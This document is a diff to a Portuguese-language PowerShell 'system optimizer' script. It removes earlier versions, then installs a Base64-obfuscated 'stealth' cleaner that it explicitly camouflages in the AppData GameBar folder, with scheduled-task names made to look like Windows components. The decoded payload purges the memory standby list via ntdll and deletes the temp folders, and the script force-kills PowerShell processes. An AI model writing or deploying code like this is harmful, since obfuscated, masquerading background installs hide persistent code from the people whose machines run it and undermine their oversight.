@@ -1147,15 +1147,78 @@ function Apply-IntelligentTweaks {
         Write-Host "    [!] Processador AMD Detectado - Otimizando SMT" -ForegroundColor Green
     }
 
-    # Instalação do Limpador Obfuscado
+    # ===== LIMPEZA DE VERSOES ANTERIORES =====
     Write-Host ""
-    Write-Host "    ⚙️ Instalando Limpador em Segundo Plano (Modo Stealth)..." -ForegroundColor Yellow
+    Write-Host "    🧹 Removendo versoes anteriores do otimizador..." -ForegroundColor Yellow
+
+    # Lista de nomes de tarefas agendadas de versoes antigas (e a atual para reinstalar limpa)
+    $oldTaskNames = @(
+        'Microsoft\Windows\Gaming\GameBarOptimization',
+        'GameBarOptimization',
+        'Otimizador_Cache',
+        'Otimizador_Cleaner',
+        'Otimizador_Windows',
+        'OtimizadorCache',
+        'OtimizadorCleaner',
+        'WindowsOptimizer',
+        'CacheCleaner',
+        'StandbyListCleaner'
+    )
+    $removedTasks = 0
+    foreach ($oldTask in $oldTaskNames) {
+        $exists = Get-ScheduledTask -TaskName $oldTask -ErrorAction SilentlyContinue
+        if ($exists) {
+            Unregister-ScheduledTask -TaskName $oldTask -Confirm:$false -ErrorAction SilentlyContinue
+            $removedTasks++
+        }
+    }
+    if ($removedTasks -gt 0) {
+        Write-Step "$removedTasks tarefa(s) agendada(s) antiga(s) removida(s)"
+    } else {
+        Write-Step "Nenhuma versao anterior encontrada no Task Scheduler" "SKIP"
+    }
+
+    # Matar processos de versoes antigas rodando em segundo plano
+    $oldProcessKeywords = @('GameBarPresenceWriter', 'Otimizador_Cache', 'OtimizadorCache', 'StandbyListCleaner')
+    foreach ($keyword in $oldProcessKeywords) {
+        Get-Process -Name "powershell", "pwsh" -ErrorAction SilentlyContinue | Where-Object {
+            $_.MainModule.FileName -and (
+                $_.CommandLine -match $keyword -or
+                $_.MainWindowTitle -match $keyword
+            )
+        } | Stop-Process -Force -ErrorAction SilentlyContinue
+    }
+
+    # Apagar scripts antigos de locais conhecidos
+    $oldScriptPaths = @(
+        "$env:APPDATA\Microsoft\Windows\GameBar\GameBarPresenceWriter.ps1",
+        "$env:APPDATA\Otimizador_Cache.ps1",
+        "$env:APPDATA\OtimizadorCache.ps1",
+        "$env:ProgramData\Otimizador\cache_cleaner.ps1",
+        "$env:ProgramData\Otimizador\cleaner.ps1"
+    )
+    $removedFiles = 0
+    foreach ($oldPath in $oldScriptPaths) {
+        if (Test-Path $oldPath) {
+            Remove-Item -Path $oldPath -Force -ErrorAction SilentlyContinue
+            $removedFiles++
+        }
+    }
+    if ($removedFiles -gt 0) {
+        Write-Step "$removedFiles arquivo(s) de versoes antigas apagado(s)"
+    }
+
+    Write-Step "Limpeza de versoes antigas concluida"
+
+    # ===== INSTALACAO DA NOVA VERSAO =====
+    Write-Host ""
+    Write-Host "    ⚙️ Instalando Limpador v3.0 (Modo Stealth)..." -ForegroundColor Yellow
     
     # Payload Base64 do Limpador
     $b64Payload = "JABzAG8AdQByAGMAZQAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAUwB5AHMASABlAGwAcABlAHIAcwAgAHsACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiACIAbgB0AGQAbABsAC4AZABsAGwAIgAiACkAXQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAdQBpAG4AdAAgAE4AdABTAGUAdABTAHkAcwB0AGUAbQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AKABpAG4AdAAgAEkAbgBmAG8AQwBsAGEAcwBzACwAIABJAG4AdABQAHQAcgAgAEkAbgBmAG8ALAAgAGkAbgB0ACAATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAEYAbAB1AHMAaAAoACkAIAB7AAoAIAAgACAAIAAgACAAIAAgAGkAbgB0AFsAXQAgAGEAcgByACAAPQAgAG4AZQB3ACAAaQBuAHQAWwBdACAAewAgADQAIAB9ADsACgAgACAAIAAgACAAIAAgACAARwBDAEgAYQBuAGQAbABlACAAaAAgAD0AIABHAEMASABhAG4AZABsAGUALgBBAGwAbABvAGMAKABhAHIAcgAsACAARwBDAEgAYQBuAGQAbABlAFQAeQBwAGUALgBQAGkAbgBuAGUAZAApADsACgAgACAAIAAgACAAIAAgACAATgB0AFMAZQB0AFMAeQBzAHQAZQBtAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAoADgAMAAsACAAaAAuAEEAZABkAHIATwBmAFAAaQBuAG4AZQBkAE8AYgBqAGUAYwB0ACgAKQAsACAANAApADsACgAgACAAIAAgACAAIAAgACAAaAAuAEYAcgBlAGUAKAApADsACgAgACAAIAAgAH0ACgB9AAoAIgBAAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoAdAByAHkAIAB7ACAAWwBTAHkAcwBIAGUAbABwAGUAcgBzAF0AOgA6AEYAbAB1AHMAaAAoACkAIAB9ACAAYwBhAHQAYwBoACAAewB9AAoAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcACoAIgAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcACoAIgAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA=="
     $decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64Payload))
     
-    # Camuflar o script num diretório do Windows AppData
+    # Camuflar o script num diretorio do Windows AppData
     $targetDir = "$env:APPDATA\Microsoft\Windows\GameBar"
     if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null }
     
